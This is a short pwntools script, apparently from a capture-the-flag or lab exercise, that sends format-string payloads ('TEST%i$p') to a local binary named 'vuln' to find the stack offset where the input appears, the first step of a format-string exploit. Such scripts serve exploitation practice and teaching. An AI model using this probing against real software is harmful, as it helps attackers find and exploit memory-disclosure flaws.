from pwn import *

# Load the binary to get its context
context.binary = elf = ELF('./vuln')

# This script will test offsets from 1 to 20
for i in range(1, 20):
    try:
        # Start the process
        p = process(elf.path)
        
        # Craft a payload with a unique marker ("TEST") and a direct parameter access specifier
        # %i$p tries to print the i-th argument as a pointer
        payload = f"TEST%{i}$p".encode()
        
        # Send the payload
        p.sendlineafter(b'> ', payload)
        
        # Read the response
        p.recvuntil(b'Announcing: ')
        response = p.recvline()
        
        print(f"Testing offset {i}: {response.decode().strip()}")
        
        # "TEST" in little-endian hex is 0x54534554. We check if the response contains it.
        if b'54534554' in response:
            print(f"\n[+] FOUND! Offset is {i}\n")
            break
            
        p.close()
    except EOFError:
        # If the process crashes, just note it and continue
        print(f"Testing offset {i}: Process crashed (EOFError)")
        pass
